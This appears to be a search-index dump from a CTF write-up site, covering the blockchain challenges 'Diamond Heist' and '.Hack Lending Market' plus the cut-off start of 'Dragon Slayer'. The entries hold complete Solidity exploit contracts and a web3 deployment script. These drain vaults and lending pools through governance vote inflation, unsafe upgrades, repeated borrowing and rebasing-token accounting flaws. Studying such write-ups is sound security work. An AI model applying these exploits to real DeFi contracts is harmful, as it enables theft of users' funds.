'3' ) conn . sendlineafter ( b 'ticket please:' , ticket ) conn . interactive () Flag \u00b6 HackTM{m1ss10n_n0t_th4t_1mmut4ble_58fb67c04fd7fedc} \u53c2\u8003\u8d44\u6599 \u00b6 UUPSUpgradeable","title":"Diamond Heist"},{"location":"blockchain/diamond_heist/#_1","text":"Salty Pretzel Swap DAO has recently come out with their new flashloan vaults. They have deposited all of their 100 Diamonds in one of their vaults. Your mission, should you choose to accept it, is to break the vault and steal all of the diamonds. This would be one of the greatest heists of all time. This text will self-destruct in ten seconds. Good luck. nc 34.141.16.87 30200 diamond_heist_contracts.zip","title":"\u9898\u76ee"},{"location":"blockchain/diamond_heist/#_2","text":"\u76ee\u6807\u662f\u5c06 100 Diamonds \u8f6c\u79fb\u5230 Setup \u5b9e\u4f8b 1 2 3 4 // contract Setup function isSolved () external view returns ( bool ) { return diamond . balanceOf ( address ( this )) == DIAMONDS ; } Setup \u90e8\u7f72\u540e\uff0c Vault \u7684\u4ee3\u7406\u5408\u7ea6\u6301\u6709 100 Diamonds\uff0c\u663e\u7136\u9700\u8981\u901a\u8fc7\u66f4\u65b0\u5408\u7ea6\u6765\u8fdb\u884c Diamond \u7684\u8f6c\u79fb\u64cd\u4f5c\u3002\u4e0d\u8fc7\uff0c Vault \u91c7\u7528 UUPS \u4ee3\u7406\u6a21\u5f0f\uff0c\u867d\u7136\u6ca1\u6709\u521d\u59cb\u5316\u5176\u903b\u8f91\u5408\u7ea6\uff0c\u4f46\u7531\u4e8e\u5b58\u5728 onlyProxy \u4fee\u9970\u7b26\uff0c\u65e0\u6cd5\u901a\u8fc7\u903b\u8f91\u5408\u7ea6\u5347\u7ea7 1 2 3 4 5 6 7 8 9 // contract Setup constructor () { vaultFactory = new VaultFactory (); vault = vaultFactory . createVault ( keccak256 ( \"The tea in Nepal is very hot.\" )); diamond = new Diamond ( DIAMONDS ); // uint constant public DIAMONDS = 100; saltyPretzel = new SaltyPretzel (); vault . initialize ( address ( diamond ), address ( saltyPretzel )); diamond . transfer ( address ( vault ), DIAMONDS ); } \u5f53 Vault \u4ee3\u7406\u5408\u7ea6\u7684\u8c03\u7528\u8005\u4e3a owner \u6216\u4ee3\u7406\u5408\u7ea6\u81ea\u8eab\u4e14\u4ee3\u7406\u5408\u7ea6\u6301\u6709 Diamond \u7684\u6570\u91cf\u4e3a \\(0\\) \u65f6\uff0c\u5141\u8bb8\u66f4\u65b0\u5408\u7ea6\u903b\u8f91 1 2 3 4 5 // contract Vault function _authorizeUpgrade ( address ) internal override view { require ( msg . sender == owner () || msg . sender == address ( this )); require ( IERC20 ( diamond ). balanceOf ( address ( this )) == 0 ); } Vault \u4ee3\u7406\u5408\u7ea6\u7684\u6240\u6709\u8005\u4e3a Setup \uff0c\u800c Setup \u4e2d\u6ca1\u6709 transferOwnership \u76f8\u5173\u7684\u903b\u8f91\uff0c\u65e0\u6cd5\u4ee5 owner \u8eab\u4efd\u66f4\u65b0\u3002\u6ce8\u610f\u5230\u5f53\u8c03\u7528\u8005\u7684\u7968\u6570\u4e0d\u5c0f\u4e8e AUTHORITY_THRESHOLD \u65f6\uff0c\u53ef\u4ee5\u4ee5 Vault \u4ee3\u7406\u5408\u7ea6\u7684\u8eab\u4efd\u8c03\u7528 Vault \u4e2d\u7684\u4efb\u610f\u51fd\u6570 1 2 3 4 5 6 7 // contract Vault uint constant public AUTHORITY_THRESHOLD = 10 _000 ether ; function governanceCall ( bytes calldata data ) external { require ( msg . sender == owner () || saltyPretzel . getCurrentVotes ( msg . sender ) >= AUTHORITY_THRESHOLD ); ( bool success ,) = address ( this ). call ( data ); require ( success ); } \u81f3\u4e8e\u4f7f IERC20(diamond).balanceOf(address(this)) == 0 \u53ef\u4ee5\u901a\u8fc7 flashloan \u89e3\u51b3 1 2 3 4 5 6 7 8 // contract Vault function flashloan ( address token , uint amount , address receiver ) external { uint balanceBefore = IERC20 ( token ). balanceOf ( address ( this )); // \u53ea\u80fd\u501f\u7528\u4ee3\u7406\u5408\u7ea6\u6301\u6709\u7684 token IERC20 ( token ). transfer ( receiver , amount ); IERC3156FlashBorrower ( receiver ). onFlashLoan ( msg . sender , token , amount , 0 , \"\" ); uint balanceAfter = IERC20 ( token ). balanceOf ( address ( this )); require ( balanceBefore == balanceAfter ); } \u90a3\u4e48\uff0c\u63a5\u4e0b\u6765\u8003\u8651\u5982\u4f55\u83b7\u53d6\u8db3\u591f\u7684\u7968\u6570\u3002\u521d\u59cb\u53ef\u901a\u8fc7 Setup.claim() \u83b7\u5f97 SALTY_PRETZELS(100 ether) \uff0c mint \u5c06\u9996\u5148\u589e\u52a0 _to \u6301\u6709\u7684\u4ee3\u5e01\u6570\u91cf\uff0c\u968f\u540e\u589e\u52a0 _delegates[_to] \u7684\u7968\u6570\u3002\u7531\u4e8e srcRep \u4e3a address(0) \uff0c\u4e0d\u5bf9\u5176\u6267\u884c\u51cf\u5c11\u7968\u6570\u7684\u64cd\u4f5c\uff0c\u56e0\u800c\u603b\u7968\u6570\u662f\u589e\u52a0\u7684 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // contract SaltyPretzel function mint ( address _to , uint256 _amount ) public onlyOwner { _mint ( _to , _amount ); _moveDelegates ( address ( 0 ), _delegates [ _to ], _amount ); } function _moveDelegates ( address srcRep , address dstRep , uint256 amount ) internal { if ( srcRep != dstRep && amount > 0 ) { if ( srcRep != address ( 0 )) { uint32 srcRepNum = numCheckpoints [ srcRep ]; uint256 srcRepOld = srcRepNum > 0 ? checkpoints [ srcRep ][ srcRepNum - 1 ]. votes : 0 ; uint256 srcRepNew = srcRepOld - amount ; _writeCheckpoint ( srcRep , srcRepNum , srcRepOld , srcRepNew ); } if ( dstRep != address ( 0 )) { uint32 dstRepNum = numCheckpoints [ dstRep ]; uint256 dstRepOld = dstRepNum > 0 ? checkpoints [ dstRep ][ dstRepNum - 1 ]. votes : 0 ; uint256 dstRepNew = dstRepOld + amount ; _writeCheckpoint ( dstRep , dstRepNum , dstRepOld , dstRepNew ); } } } \u4ee3\u5e01 SP \u7684\u6570\u91cf\u81ea Setup.claim() \u540e\u4e0d\u518d\u53d8\u5316\uff0c _moveDelegates \u4ece address(0) \u5230\u4efb\u610f\u4e0d\u4e3a 0 \u7684\u5730\u5740\u4f3c\u4e4e\u662f\u589e\u52a0\u603b\u7968\u6570\u7684\u552f\u4e00\u65b9\u6cd5\u3002\u5f53 delegator \u521d\u6b21\u58f0\u660e delegatee \u65f6\uff0c currentDelegate \u4e3a address(0) \uff0c\u5c06\u4e3a delegatee \u589e\u52a0 balanceOf(delegator) \u7968\u3002\u90a3\u4e48\uff0c\u53ef\u4ee5\u5c06\u6301\u6709\u7684\u4ee3\u5e01\u8f6c\u79fb\u7ed9\u65b0\u7684 delegator \u518d\u7531\u5176\u8c03\u7528 delegate() \u6765\u589e\u52a0 delegatee \u7684\u7968\u6570 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // contract SaltyPretzel function delegate ( address delegatee ) external { return _delegate ( msg . sender , delegatee ); } function _delegate ( address delegator , address delegatee ) internal { address currentDelegate = _delegates [ delegator ]; uint256 delegatorBalance = balanceOf ( delegator ); _delegates [ delegator ] = delegatee ; emit DelegateChanged ( delegator , currentDelegate , delegatee ); _moveDelegates ( currentDelegate , delegatee , delegatorBalance ); }","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/diamond_heist/#exploit","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 contract HackerVault is Vault { // new implementation should also be UUPS function exploit ( address token , address setup ) external { IERC20 ( token ). transfer ( address ( setup ), 100 ); } } contract Helper { function help ( address instance ) external { SaltyPretzel ( instance ). delegate ( msg . sender ); SaltyPretzel ( instance ). transfer ( msg . sender , 100 ether ); } } contract Hack is IERC3156FlashBorrower { Setup setup ; SaltyPretzel saltyPretzel ; Vault vault ; constructor ( address instance ) { setup = Setup ( instance ); saltyPretzel = SaltyPretzel ( setup . saltyPretzel ()); vault = Vault ( setup . vault ()); } function exploit () external { saltyPretzel . delegate ( address ( this )); setup . claim (); for ( uint i = 1 ; i < 100 ; i ++ ) { Helper helper = new Helper (); saltyPretzel . transfer ( address ( helper ), 100 ether ); helper . help ( address ( saltyPretzel )); } vault . flashloan ( address ( setup . diamond ()), 100 , address ( this )); } function onFlashLoan ( address , address token , uint256 amount , uint256 , bytes calldata ) external override returns ( bytes32 ) { HackerVault hackerVault = new HackerVault (); vault . governanceCall ( abi . encodeWithSignature ( \"upgradeTo(address)\" , address ( hackerVault ) )); IERC20 ( token ). transfer ( address ( vault ), amount ); return keccak256 ( \"ERC3156FlashBorrower.onFlashLoan\" ); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 from web3 import Web3 import pwn hack_abi = open ( 'hack_abi.json' ) . read () hack_bytecode = open ( 'hack_bytecode.txt' , 'r' ) . read () hackervault_abi = open ( 'hackervault_abi.json' ) . read () hackervault_bytecode = open ( 'hackervault_bytecode.txt' ) . read () setup_abi = open ( 'setup_abi.json' ) . read () def transact ( func ): tx = account . sign_transaction ( eval ( func ) . buildTransaction ({ 'chainId' : w3 . eth . chain_id , 'nonce' : w3 . eth . get_transaction_count ( account . address ), 'gas' : eval ( func ) . estimate_gas (), 'gasPrice' : w3 . eth . gas_price , })) . rawTransaction tx_hash = w3 . eth . send_raw_transaction ( tx ) . hex () return w3 . eth . wait_for_transaction_receipt ( tx_hash ) conn = pwn . remote ( '34.141.16.87' , 30200 ) conn . sendlineafter ( b 'action?' , b '1' ) ticket = conn . recvline_contains ( b 'ticket' ) . decode () . split ( ' ' )[ - 1 ] . strip () w3 = Web3 ( Web3 . HTTPProvider ( conn . recvline_contains ( b 'rpc' ) . decode () . split ( ' ' )[ - 1 ])) account = w3 . eth . account . from_key ( conn . recvline_contains ( b 'key' ) . decode () . split ( ' ' )[ - 1 ]) setup_addr = conn . recvline_contains ( b 'contract' ) . decode () . split ( ' ' )[ - 1 ] . strip () setup_contract = w3 . eth . contract ( address = setup_addr , abi = setup_abi ) hack_contract = w3 . eth . contract ( abi = hack_abi , bytecode = hack_bytecode ) hack_addr = transact ( 'hack_contract.constructor(setup_addr)' ) . contractAddress hack_contract = w3 . eth . contract ( address = hack_addr , abi = hack_abi ) print ( hack_addr ) transact ( 'hack_contract.functions.exploit()' ) vault_addr = setup_contract . functions . vault () . call () diamond_addr = setup_contract . functions . diamond () . call () hackervault_contract = w3 . eth . contract ( address = vault_addr , abi = hackervault_abi ) transact ( 'hackervault_contract.functions.exploit(diamond_addr, setup_addr)' ) if setup_contract . functions . isSolved () . call (): conn = pwn . remote ( '34.141.16.87' , 30200 ) conn . sendlineafter ( b 'action?' , b '3' ) conn . sendlineafter ( b 'ticket please:' , ticket ) conn . interactive ()","title":"Exploit"},{"location":"blockchain/diamond_heist/#flag","text":"HackTM{m1ss10n_n0t_th4t_1mmut4ble_58fb67c04fd7fedc}","title":"Flag"},{"location":"blockchain/diamond_heist/#_3","text":"UUPSUpgradeable","title":"\u53c2\u8003\u8d44\u6599"},{"location":"blockchain/dot_hack_lending_market/","tags":["smart contract","rebasing token","first deposit","empty market","lending"],"text":"#smart contract #rebasing token #first deposit #empty market #lending .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Description \u00b6 Please save our money in Lending protocol. dot_hack_lending_market.zip Solution \u00b6 Initially, there are 10,000 .Hack USD, 10,000 .Hack WETH and 10,000 .Hack RebasingWETH in the .Hack lending pool. RebasingWETH can be used to withdraw WETH. The account who registers for the challenge will be recorded as the solver and receive 10,000 USD and 10,000 WETH. When the solver holds 20,000 USD and 30,000 WETH, the challenge is solved. That is, we need to drain tokens in the lending pool The lending pool has the basic functions of a common lending pool, such as depositing liquidity, borrowing, and liquidation. In the depositLiquidity() function, the amount added to the liquidity depends on how much the balance has changed before and after the transfer. This pattern is problematic for .Hack RebasingWETH. Because balanceOf() returns the amount of underlying tokens corresponding to the share balance, while transferFrom() transfers the amount of shares. If exchange rate is larger than 1e18 , depositing 1 share can increase liquidity by more than 1. Meanwhile, withdrawLiquidity() checks against the recorded amount 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 function depositLiquidity ( address asset , uint256 amount ) external { require ( assetInfo [ asset ]. isAsset ); accrueInterest ( msg . sender , asset ); UserInfo storage _userInfo = userInfo [ msg . sender ][ asset ]; AssetInfo storage _assetInfo = assetInfo [ asset ]; if ( _userInfo . liquidityIndex == 0 ) { _userInfo . liquidityIndex = _assetInfo . globalIndex ; } uint256 beforeBalance = IERC20 ( asset ). balanceOf ( address ( this )); require ( IERC20 ( asset ). transferFrom ( msg . sender , address ( this ), amount )); uint256 afterBalance = IERC20 ( asset ). balanceOf ( address ( this )) - beforeBalance ; _userInfo . liquidityAmount += afterBalance ; _assetInfo . totalLiquidity += afterBalance ; _assetInfo . avaliableLiquidity += afterBalance ; } function withdrawLiquidity ( address asset , uint256 amount ) external { ... require ( _assetInfo . avaliableLiquidity >= amount ); _userInfo . liquidityAmount -= amount ; _assetInfo . totalLiquidity -= amount ; _assetInfo . avaliableLiquidity -= amount ; require ( IERC20 ( asset ). transfer ( msg . sender , amount )); } The borrow() function performs a healthy check to see if the collateral is sufficient to cover the borrow amount. However, it checks against the borrow value in the current call to the borrow() function instead of the total borrow value. So, malicious users may borrow many times as long as the healthy check is met each time, leaving bad debts 1 2 3 4 5 6 7 8 9 10 11 function borrow ( address collateral , address borrowAsset , uint256 amount ) external { require ( assetInfo [ borrowAsset ]. isAsset ); UserInfo storage _userInfo = userInfo [ msg . sender ][ collateral ]; ... AssetInfo storage _assetInfo = assetInfo [ borrowAsset ]; ... uint256 collateralValue = _userInfo . collateralAmount * oracle . getPrice ( collateral ); uint256 borrowValue = amount * oracle . getPrice ( borrowAsset ); require ( collateralValue * assetInfo [ collateral ]. borrowLTV >= borrowValue * 1e18 ); ... } After malicious borrowing, the liquidate() function can be utilized to withdraw collateral tokens. Since the price difference between USD (1) and WETH (3000) / RebasingWETH (3100) is large, an intuitive idea is to use USD as collateral and later withdraw all USD with a small amount of WETH / RebasingWETH through liquidate() without repaying all debts. Liquidation increases rewards for liquidity providers ( avaliableClaimableReward ), which can be used to withdraw paid WETH / RebasingWETH 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 function liquidate ( address user , address collateral , uint256 amount ) external { accrueInterest ( user , collateral ); UserInfo storage _userInfo = userInfo [ msg . sender ][ collateral ]; address asset = _userInfo . borrowAsset ; ... uint256 collateralValue = _userInfo . collateralAmount * oracle . getPrice ( collateral ); uint256 borrowValue = _userInfo . totalDebt * oracle . getPrice ( asset ); require ( collateralValue * assetInfo [ collateral ]. liquidationLTV <= borrowValue * 1e18 ); AssetInfo storage _assetInfo = assetInfo [ _userInfo . borrowAsset ]; uint256 refundCollateral = amount * oracle . getPrice ( asset ) / oracle . getPrice ( collateral ) + amount * oracle . getPrice ( asset ) / oracle . getPrice ( collateral ) * _assetInfo . liquidationBonus / 1e18 ; if ( refundCollateral > _userInfo . collateralAmount ) { refundCollateral = _userInfo . collateralAmount ; } _userInfo . collateralAmount -= refundCollateral ; uint256 borrowInterest = _userInfo . totalDebt - _userInfo . principal ; _userInfo . totalDebt -= amount ; _assetInfo . totalDebt -= amount ; if ( borrowInterest < amount ) { _userInfo . principal -= amount - borrowInterest ; _assetInfo . totalPrincipal -= amount - borrowInterest ; _assetInfo . avaliableClaimableReward += borrowInterest ; _assetInfo . avaliableLiquidity += amount - borrowInterest ; } else { _assetInfo . avaliableClaimableReward += amount ; } require ( IERC20 ( asset ). transferFrom ( msg . sender , address ( this ), amount )); require ( IERC20 ( collateral ). transfer ( msg . sender , refundCollateral )); } Exploitation \u00b6 The exploitation steps are as follows: Register for the challenge and receive tokens Deposit USD as collateral and borrow some RebasingWETH Exchange RebasingWETH with WETH and deposit most of them as liquidity To earn claimableReward , we need to call updateAsset() to update globalIndex , otherwise the interest will never accrue Borrow all RebasingWETH in the lending pool Withdraw the USD collateral through liquidate() and later claim paid RebasingWETH Redeem all WETH with RebasingWETH Deposit 10,000 WETH into DotHackRebasingToken and then transfer 10,000 WETH into it to increase the exchange rate Abuse the depositLiquidity() to earn collateral while being available to withdraw all tokens Borrow all remaining tokens in the lending pool Redeem WETH from DotHackRebasingToken 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 contract BorrowHelper { uint constant INITIAL_AMOUNT = 10000 ether ; uint constant BORROW_AMOUNT = 2 ether ; uint constant REPAY_AMOUNT = 3 ether ; Challenge _challenge ; address _collateral ; address _asset ; constructor ( Challenge challenge ) { _challenge = challenge ; } function initialize ( address collateral , address asset ) external { _collateral = collateral ; _asset = asset ; Challenge challenge = _challenge ; DotHackLending lending = DotHackLending ( challenge . dotHackLending ()); IERC20 ( collateral ). approve ( address ( lending ), type ( uint256 ). max ); IERC20 ( asset ). approve ( address ( lending ), type ( uint256 ). max ); lending . depositCollateral ( collateral , INITIAL_AMOUNT ); for ( uint i ; i < 10 ; ++ i ) { lending . borrow ( collateral , asset , BORROW_AMOUNT ); } lending . updateAsset ( asset ); // To update globalIndex lending . depositLiquidity ( asset , INITIAL_AMOUNT - REPAY_AMOUNT ); } function borrow () external { Challenge challenge = _challenge ; address collateral = _collateral ; address asset = _asset ; DotHackLending lending = DotHackLending ( challenge . dotHackLending ()); for ( uint i ; i < 499 ; ++ i ) { lending . borrow ( collateral , asset , BORROW_AMOUNT ); } } function liquidate () external { Challenge challenge = _challenge ; address collateral = _collateral ; DotHackLending lending = DotHackLending ( challenge . dotHackLending ()); lending . liquidate ( address ( this ), collateral , REPAY_AMOUNT ); IERC20 ( collateral ). transfer ( msg . sender , IERC20 ( collateral ). balanceOf ( address ( this ))); } function claim () external { Challenge challenge = _challenge ; address asset = _asset ; DotHackLending lending = DotHackLending ( challenge . dotHackLending ()); lending . claimReward ( asset , REPAY_AMOUNT ); lending . withdrawLiquidity ( asset , INITIAL_AMOUNT - REPAY_AMOUNT ); IERC20 ( asset ). transfer ( msg . sender , IERC20 ( asset ). balanceOf ( address ( this ))); } } contract RebaseAbuser { uint constant INITIAL_AMOUNT = 10000 ether ; function exploit ( Challenge challenge , address asset ) external { DotHackLending lending = DotHackLending ( challenge . dotHackLending ()); address rebaseWeth = challenge . dotHackRebasingWETH (); IERC20 ( rebaseWeth ). approve ( address ( lending ), type ( uint256 ). max ); lending . depositLiquidity ( rebaseWeth , INITIAL_AMOUNT ); lending . withdrawLiquidity ( rebaseWeth , INITIAL_AMOUNT ); lending . depositCollateral ( rebaseWeth , INITIAL_AMOUNT ); for ( uint i ; i < 2 ; ++ i ) { lending . borrow ( rebaseWeth , asset , INITIAL_AMOUNT / 2 ); } IERC20 ( asset ). transfer ( msg . sender , INITIAL_AMOUNT ); IERC20 ( rebaseWeth ). transfer ( msg . sender , INITIAL_AMOUNT ); } } contract Solve is Script { function run () public { vm . startBroadcast ( vm . envUint ( \"PRIV\" )); Challenge challenge = Challenge ( vm . envAddress ( \"CHALL\" )); vm . roll ( block . number + 1 ); Hack hack = new Hack ( challenge ); hack . initialize (); BorrowHelper helper = hack . rebaseBorrower (); for ( uint i ; i < 10 ; ++ i ) { vm . roll ( block . number + 1 ); helper . borrow (); } hack . exploit (); require ( challenge . isSolved ()); vm . stopBroadcast (); } }","title":".Hack Lending Market"},{"location":"blockchain/dot_hack_lending_market/#description","text":"Please save our money in Lending protocol. dot_hack_lending_market.zip","title":"Description"},{"location":"blockchain/dot_hack_lending_market/#solution","text":"Initially, there are 10,000 .Hack USD, 10,000 .Hack WETH and 10,000 .Hack RebasingWETH in the .Hack lending pool. RebasingWETH can be used to withdraw WETH. The account who registers for the challenge will be recorded as the solver and receive 10,000 USD and 10,000 WETH. When the solver holds 20,000 USD and 30,000 WETH, the challenge is solved. That is, we need to drain tokens in the lending pool The lending pool has the basic functions of a common lending pool, such as depositing liquidity, borrowing, and liquidation. In the depositLiquidity() function, the amount added to the liquidity depends on how much the balance has changed before and after the transfer. This pattern is problematic for .Hack RebasingWETH. Because balanceOf() returns the amount of underlying tokens corresponding to the share balance, while transferFrom() transfers the amount of shares. If exchange rate is larger than 1e18 , depositing 1 share can increase liquidity by more than 1. Meanwhile, withdrawLiquidity() checks against the recorded amount 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 function depositLiquidity ( address asset , uint256 amount ) external { require ( assetInfo [ asset ]. isAsset ); accrueInterest ( msg . sender , asset ); UserInfo storage _userInfo = userInfo [ msg . sender ][ asset ]; AssetInfo storage _assetInfo = assetInfo [ asset ]; if ( _userInfo . liquidityIndex == 0 ) { _userInfo . liquidityIndex = _assetInfo . globalIndex ; } uint256 beforeBalance = IERC20 ( asset ). balanceOf ( address ( this )); require ( IERC20 ( asset ). transferFrom ( msg . sender , address ( this ), amount )); uint256 afterBalance = IERC20 ( asset ). balanceOf ( address ( this )) - beforeBalance ; _userInfo . liquidityAmount += afterBalance ; _assetInfo . totalLiquidity += afterBalance ; _assetInfo . avaliableLiquidity += afterBalance ; } function withdrawLiquidity ( address asset , uint256 amount ) external { ... require ( _assetInfo . avaliableLiquidity >= amount ); _userInfo . liquidityAmount -= amount ; _assetInfo . totalLiquidity -= amount ; _assetInfo . avaliableLiquidity -= amount ; require ( IERC20 ( asset ). transfer ( msg . sender , amount )); } The borrow() function performs a healthy check to see if the collateral is sufficient to cover the borrow amount. However, it checks against the borrow value in the current call to the borrow() function instead of the total borrow value. So, malicious users may borrow many times as long as the healthy check is met each time, leaving bad debts 1 2 3 4 5 6 7 8 9 10 11 function borrow ( address collateral , address borrowAsset , uint256 amount ) external { require ( assetInfo [ borrowAsset ]. isAsset ); UserInfo storage _userInfo = userInfo [ msg . sender ][ collateral ]; ... AssetInfo storage _assetInfo = assetInfo [ borrowAsset ]; ... uint256 collateralValue = _userInfo . collateralAmount * oracle . getPrice ( collateral ); uint256 borrowValue = amount * oracle . getPrice ( borrowAsset ); require ( collateralValue * assetInfo [ collateral ]. borrowLTV >= borrowValue * 1e18 ); ... } After malicious borrowing, the liquidate() function can be utilized to withdraw collateral tokens. Since the price difference between USD (1) and WETH (3000) / RebasingWETH (3100) is large, an intuitive idea is to use USD as collateral and later withdraw all USD with a small amount of WETH / RebasingWETH through liquidate() without repaying all debts. Liquidation increases rewards for liquidity providers ( avaliableClaimableReward ), which can be used to withdraw paid WETH / RebasingWETH 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 function liquidate ( address user , address collateral , uint256 amount ) external { accrueInterest ( user , collateral ); UserInfo storage _userInfo = userInfo [ msg . sender ][ collateral ]; address asset = _userInfo . borrowAsset ; ... uint256 collateralValue = _userInfo . collateralAmount * oracle . getPrice ( collateral ); uint256 borrowValue = _userInfo . totalDebt * oracle . getPrice ( asset ); require ( collateralValue * assetInfo [ collateral ]. liquidationLTV <= borrowValue * 1e18 ); AssetInfo storage _assetInfo = assetInfo [ _userInfo . borrowAsset ]; uint256 refundCollateral = amount * oracle . getPrice ( asset ) / oracle . getPrice ( collateral ) + amount * oracle . getPrice ( asset ) / oracle . getPrice ( collateral ) * _assetInfo . liquidationBonus / 1e18 ; if ( refundCollateral > _userInfo . collateralAmount ) { refundCollateral = _userInfo . collateralAmount ; } _userInfo . collateralAmount -= refundCollateral ; uint256 borrowInterest = _userInfo . totalDebt - _userInfo . principal ; _userInfo . totalDebt -= amount ; _assetInfo . totalDebt -= amount ; if ( borrowInterest < amount ) { _userInfo . principal -= amount - borrowInterest ; _assetInfo . totalPrincipal -= amount - borrowInterest ; _assetInfo . avaliableClaimableReward += borrowInterest ; _assetInfo . avaliableLiquidity += amount - borrowInterest ; } else { _assetInfo . avaliableClaimableReward += amount ; } require ( IERC20 ( asset ). transferFrom ( msg . sender , address ( this ), amount )); require ( IERC20 ( collateral ). transfer ( msg . sender , refundCollateral )); }","title":"Solution"},{"location":"blockchain/dot_hack_lending_market/#exploitation","text":"The exploitation steps are as follows: Register for the challenge and receive tokens Deposit USD as collateral and borrow some RebasingWETH Exchange RebasingWETH with WETH and deposit most of them as liquidity To earn claimableReward , we need to call updateAsset() to update globalIndex , otherwise the interest will never accrue Borrow all RebasingWETH in the lending pool Withdraw the USD collateral through liquidate() and later claim paid RebasingWETH Redeem all WETH with RebasingWETH Deposit 10,000 WETH into DotHackRebasingToken and then transfer 10,000 WETH into it to increase the exchange rate Abuse the depositLiquidity() to earn collateral while being available to withdraw all tokens Borrow all remaining tokens in the lending pool Redeem WETH from DotHackRebasingToken 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 contract BorrowHelper { uint constant INITIAL_AMOUNT = 10000 ether ; uint constant BORROW_AMOUNT = 2 ether ; uint constant REPAY_AMOUNT = 3 ether ; Challenge _challenge ; address _collateral ; address _asset ; constructor ( Challenge challenge ) { _challenge = challenge ; } function initialize ( address collateral , address asset ) external { _collateral = collateral ; _asset = asset ; Challenge challenge = _challenge ; DotHackLending lending = DotHackLending ( challenge . dotHackLending ()); IERC20 ( collateral ). approve ( address ( lending ), type ( uint256 ). max ); IERC20 ( asset ). approve ( address ( lending ), type ( uint256 ). max ); lending . depositCollateral ( collateral , INITIAL_AMOUNT ); for ( uint i ; i < 10 ; ++ i ) { lending . borrow ( collateral , asset , BORROW_AMOUNT ); } lending . updateAsset ( asset ); // To update globalIndex lending . depositLiquidity ( asset , INITIAL_AMOUNT - REPAY_AMOUNT ); } function borrow () external { Challenge challenge = _challenge ; address collateral = _collateral ; address asset = _asset ; DotHackLending lending = DotHackLending ( challenge . dotHackLending ()); for ( uint i ; i < 499 ; ++ i ) { lending . borrow ( collateral , asset , BORROW_AMOUNT ); } } function liquidate () external { Challenge challenge = _challenge ; address collateral = _collateral ; DotHackLending lending = DotHackLending ( challenge . dotHackLending ()); lending . liquidate ( address ( this ), collateral , REPAY_AMOUNT ); IERC20 ( collateral ). transfer ( msg . sender , IERC20 ( collateral ). balanceOf ( address ( this ))); } function claim () external { Challenge challenge = _challenge ; address asset = _asset ; DotHackLending lending = DotHackLending ( challenge . dotHackLending ()); lending . claimReward ( asset , REPAY_AMOUNT ); lending . withdrawLiquidity ( asset , INITIAL_AMOUNT - REPAY_AMOUNT ); IERC20 ( asset ). transfer ( msg . sender , IERC20 ( asset ). balanceOf ( address ( this ))); } } contract RebaseAbuser { uint constant INITIAL_AMOUNT = 10000 ether ; function exploit ( Challenge challenge , address asset ) external { DotHackLending lending = DotHackLending ( challenge . dotHackLending ()); address rebaseWeth = challenge . dotHackRebasingWETH (); IERC20 ( rebaseWeth ). approve ( address ( lending ), type ( uint256 ). max ); lending . depositLiquidity ( rebaseWeth , INITIAL_AMOUNT ); lending . withdrawLiquidity ( rebaseWeth , INITIAL_AMOUNT ); lending . depositCollateral ( rebaseWeth , INITIAL_AMOUNT ); for ( uint i ; i < 2 ; ++ i ) { lending . borrow ( rebaseWeth , asset , INITIAL_AMOUNT / 2 ); } IERC20 ( asset ). transfer ( msg . sender , INITIAL_AMOUNT ); IERC20 ( rebaseWeth ). transfer ( msg . sender , INITIAL_AMOUNT ); } } contract Solve is Script { function run () public { vm . startBroadcast ( vm . envUint ( \"PRIV\" )); Challenge challenge = Challenge ( vm . envAddress ( \"CHALL\" )); vm . roll ( block . number + 1 ); Hack hack = new Hack ( challenge ); hack . initialize (); BorrowHelper helper = hack . rebaseBorrower (); for ( uint i ; i < 10 ; ++ i ) { vm . roll ( block . number + 1 ); helper . borrow (); } hack . exploit (); require ( challenge . isSolved ()); vm . stopBroadcast (); } }","title":"Exploitation"},{"location":"blockchain/dragon_slayer/","tags":["smart contract","solidity","flashloan"],"text":"#smart contract #solidity #flashloan .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 Prove yourself a true champion. Kill the mighty dragon and earn the right to call yourself a dragon slayer. nc 34.141.16.87 30100 dragon_slayer_contracts.zip \u89e3\u9898\u601d\u8def \u00b6 \u76ee\u6807\u662f\u51fb\u8d25\u6076\u9f99w 1 2 3 4 // contract Setup function isSolved () external view returns ( bool ) { return knight . health () > 0 && knight . dragon (). health 